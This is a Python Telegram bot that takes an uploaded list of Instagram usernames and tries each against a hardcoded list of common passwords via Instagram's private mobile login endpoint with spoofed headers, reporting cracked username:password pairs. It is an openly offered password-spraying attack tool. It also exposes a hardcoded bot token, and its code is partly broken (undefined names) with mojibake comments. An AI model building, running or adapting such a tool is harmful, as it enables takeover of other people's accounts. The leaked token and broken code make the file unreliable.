import os 
#os.system('pip install telebot')
#os.system('pip install uuid4')
import telebot
import threading
from telebot import types
import requests
import requests
import random
from uuid import uuid4
#ØŒØ§Ù„Ø¨ÙˆØª Ù„ÙŠØ´ Ù„ÙŠ Ø§Ù„Ø¨ÙŠØ¹ Ù„ÙŠØ´ ğŸ™‚
#ØµÙ„ÙŠ Ø¹Ù„ÙŠ Ø§Ù„Ù†Ø¨ÙŠ ÙˆØ§Ø³ØªØºÙØ± Ù…Ù…ÙƒÙ† Ø±Ø¨Ù†Ø§ ÙŠØµÙ„Ø­ Ø­Ø§Ù„Ùƒ ÙˆØ­Ø§Ù„Ù† Ø§Ù„ÙŠ Ø§Ù„Ø§ÙØ¶Ù„ ÙˆØ³Ù„Ø§Ù… 
#YASIR_@PR_7N 
#Ø§Ø§ÙŠ Ù…Ø´ÙƒÙ„Ù‡ ØªØ¹Ø§Ù„ÙŠ. 
psw = [loka]
tok = "6693902485:AAFW-xYUBSOuAQdcxtEnh7zYFWqZNCb5Nz4"
bot = telebot.TeleBot(tok)
go = types.InlineKeyboardButton(text ="Ø¨Ø¯Ø¡ Ø§Ù„ØµÙŠØ¯",callback_data = "YASIR1")
my = types.InlineKeyboardButton(text ="YASIR-ÙŠØ§Ø³Ø±",url ="https://t.me/PR_7N")
@bot.message_handler(commands=['start'])
def start(message):
	id  = f"t.me/{message.from_user.username}"
	tag = f"[{message.from_user.first_name}]({id})"
	text = '*HI PRO *{}* MY BOT INSTA*'.format(tag)
	YASIR2 =types.InlineKeyboardMarkup()
	YASIR2.add(go)
	YASIR2.add(my)
	bot.send_photo(message.chat.id,id,text, 
parse_mode="Markdown",reply_markup=YASIR2)
@bot.callback_query_handler(lambda call:True)
def caall(call): 
		if call.data == "YASIR1":			
			messag=bot.send_message(chat_id=call.message.chat.id,text=' *Ø§Ø±Ø³Ù„ Ù…Ù„Ù .txt :*',parse_mode='Markdown')
			bot.register_next_step_handler(messag,check,messag.id)
@bot.message_handler(content_types=["document"])
def check(message,id):
	#bot.send_message(message.chat.id,'Test')
	#while True:
	idd = message.chat.id
	namee = message.document.file_name
	download  = bot.get_file(message.document.file_id)
	down_file = bot.download_file(download.file_path)
	iid = bot.send_message(message.chat.id,'Done File')
	with open(namee, 'wb') as gett:
		gett.write(down_file)
		p_file = open(namee, "r")
		psw.append("1029384756")
		psw.append("12345qwert")
		psw.append("200220024")
		psw.append("19951995")
		#psw.append("12345qwert")
		psw.append("1234qwer")
		psw.append("20012001")
		psw.append("12341234")
		psw.append("Aa123123")
		psw.append("Aa123456")
		psw.append("19901990")
		psw.append("19701970")
		psw.append("19771977")
		psw.append("19891989")
		psw.append("19751975")
		psw.append("19761976")
		psw.append("19811981")
		psw.append("20222022")
		psw.append('30303030')
		psw.append("0099887766")
		psw.append("1234@@@@")

	ok = 0
	cp =0
	with open(namee, 'wb') as gett:
	   gett.write(down_file)
	   p_file2 = open(namee, "r")
	for _ in range(len(p_file.readlines())):    
		user = p_file2.readline().split('\n')[0]
		for pasw in psw:
			try:
				#while True:
					url = 'https://i.instagram.com/api/v1/accounts/login/'
					headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',  'Accept':'*/*', 
	'Cookie':'missing', 
	'Accept-Encoding':'gzip, deflate', 
	'Accept-Language':'en-US', 
	'X-IG-Capabilities':'3brTvw==', 
	'X-IG-Connection-Type':'WIFI', 
	'Content-Type':'application/x-www-form-urlencoded; charset=UTF-8', 
	'Host':'i.instagram.com'}
					uid= str(uuid4())
					data = {'uuid':uid,
	'password':pasw, 
	'username':user, 
	'device_id':uid, 
	'from_reg':'false', 
	'_csrftoken':'missing', 
	'login_attempt_countn':'0'}
					reqq= requests.post(url, headers=headers, data=data)
					if 'checkpoint_challenge_required' in reqq.text:
						ok+=1
						tlg = f''' Done âœ…
					=================
					user : {user}
					pas : {pasw}
					================='''
						
					else:
						cp+=1
					
			except:
				cp+=1
			yy3 = types.InlineKeyboardButton(f"{user}:{pasw}", callback_data='x')
			oko = types.InlineKeyboardButton(f"OK : {ok}", callback_data='x')
			cpo= types.InlineKeyboardButton(f"CP : {cp}", callback_data='x')
			myy= types.InlineKeyboardButton(f"YASIR -ÙŠØ§Ø³Ø±", url='https://t.me/PR_7N')
			YASIR7 = types.InlineKeyboardMarkup(row_width=1)
			YASIR7.add(yy3)
			YASIR7.add(oko)
			YASIR7.add(cpo)
			YASIR7.add(myy)
			bot.edit_message_text(chat_id=message.chat.id, message_id=id, text='''ğŸš¹ Checking YOR BOTS...\n by: @PR_7N ''', reply_markup=YASIR7)
@bot.callback_query_handler(func=lambda call: call.data == 'stop')
def menu_callback(call):
	id=call.from_user.id
	stopuser[f'{id}']['status'] = 'stop'
print("ØªÙ… ØªØ´ØºÙŠÙ„ Ø§Ù„Ø¨ÙˆØª")
while True:
	try:
		bot.polling(none_stop=True)
	except Exception as e:
		print(f"Ø­Ø¯Ø« Ø®Ø·Ø£: {e}")
